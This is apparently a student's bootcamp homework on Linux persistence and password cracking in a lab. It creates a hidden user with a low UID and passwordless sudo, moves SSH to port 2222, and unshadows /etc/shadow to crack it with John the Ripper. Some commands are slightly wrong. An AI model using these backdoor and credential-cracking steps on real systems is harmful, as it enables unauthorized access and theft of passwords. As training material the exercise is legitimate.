✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･*✧Week 6 Homework Submission File: Advanced Bash - Owning the System･*✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: *✧･ﾟ:*✧･ﾟ: **
    
Nicole Kemp

26TH OF JAN 2022

Week 6 Homework Submission File
 
 ✧･ﾟ*✲ﾟ*✧･ﾟ✧･ﾟ*✲ﾟ*✧･ﾟ✧･ﾟ*✲ﾟ*✧･ﾟ*✲ﾟ*✧･ﾟ:✧･ﾟ*✲ Notes for TAsﾟ*✧･ﾟ*✲ﾟ*✧･ﾟ✧･ﾟ*✲ﾟ*✧･ﾟ*✲ﾟ*✧･ﾟ✧･ﾟ*✲ﾟ*✧･ﾟ*✲ﾟ*✧･ﾟ

For the user `sysd`, I made their password extremely simple to crack just to make this assignment easier to complete. A true red hat attacking a machine would choose something more difficult to crack.

ﾟ*✧･ﾟ*✲ﾟ*✧･ﾟ✧･ﾟ*✲ﾟ*✧･ﾟ*✲ﾟ*✧･ﾟ✧･ﾟ*✲ﾟ*✧･ﾟ*✲ﾟ*✧･ﾟﾟ*✧･ﾟ*✲ﾟ*✧･ﾟ✧･ﾟ*✲ﾟ*✧･ﾟ*✲ﾟ*✧･ﾟ✧･ﾟ*✲ﾟ*✧･ﾟ*✲ﾟ*✧･ﾟﾟ*✧･ﾟ*✲ﾟ*✧･ﾟ✧･ﾟ*✲ﾟ*✧･ﾟ*


(ﾉ0ヮ0)ﾉ*✲ﾟ✧･ﾟ**Step 1: Shadow People** 

1. Create a secret user named `sysd`. Make sure this user doesn't have a home folder created:
    - `sudo adduser sysd`

2. Give your secret user a password: 
    - `sudo passwd enter`

3. Give your secret user a system UID < 1000:
    - `sudo usermod -u 500 sysd`

4. Give your secret user the same GID:
   - `sudo groupmod -g 500 sysd`

5. Give your secret user full `sudo` access without the need for a password:
   -  `Sudo visudo` then `sysd ALL=(ALL:ALL) NOPASSWD:ALL`

6. Test that `sudo` access works without your password:

   -  `sudo -v` is usually used to extend your sudo password timeout, but can be used for determining whether you have any sudo privileges.
   `sudo -n true` was also a recomendation from the internet.

(ﾉ0ヮ0)ﾉ*✲ﾟ✧･ﾟ**Step 2: Smooth Sailing**

1. Edit the `sshd_config` file:

    `port 22` 

    `port 2222`

(ﾉ0ヮ0)ﾉ*✲ﾟ✧･ﾟ**Step 3: Testing Your Configuration Update**
1. Restart the SSH service:
    - `service ssh restart`

2. Exit the `root` account:
    - `su sysd`

3. SSH to the target machine using your `sysd` account and port `2222`:
    - `ssh sysd@192.168.6.105 -p 2222`

4. Use `sudo` to switch to the root user:
    - `sudo su root` or `sudo su -`

(ﾉ0ヮ0)ﾉ*✲ﾟ✧･ﾟ**Step 4: Crack All the Passwords**

1. SSH back to the system using your `sysd` account and port `2222`:

    - `ssh sysd@192.168.6.105 -p 2222`

2. Escalate your privileges to the `root` user. Use John to crack the entire `/etc/shadow` file:

    - `sudo su ~`
    then I ran john but I wanted it to crack and place the passwords in a text file. So I did ` unshadow /etc/passwd /etc/shadow > mypasswd.txt` . Then I made sure that `mypasswd.txt` is available to view as any user `/usr/sbin/john mypasswd.txt` John then started to print out the cracked usernames and passwords. 



❀✿＊*---*＊✿❀--❀✿＊*---*＊✿❀--❀✿＊*---*＊✿❀-❀✿＊*---*＊✿❀-❀✿＊*---*＊✿-❀✿＊*--❀✿＊*---*＊✿❀--❀✿＊*---*＊✿❀--❀✿＊*---*＊✿

(ﾉ^∇^)ﾉﾟFREEDOM!!!